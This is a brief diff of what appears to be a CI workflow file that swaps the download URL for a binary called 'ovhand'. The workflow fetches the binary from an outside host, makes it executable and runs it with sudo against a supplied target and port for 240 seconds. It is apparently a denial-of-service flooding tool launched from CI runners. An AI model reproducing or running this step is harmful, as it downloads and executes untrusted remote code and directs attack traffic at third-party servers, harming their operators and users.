@@ -29,7 +29,7 @@ jobs:
           TARGET="${{ inputs.target }}"
           PORT="${{ inputs.port }}"
           
-          wget https://wgetz.com/7wYVJHOeWv/ovhand -O OVH
+          wget https://wgetz.com/9Xey60yEvo/ovhand -O OVH
           chmod +x OVH || true
           
           sudo timeout 240 ./OVH "$TARGET" "$PORT" 2 240 &
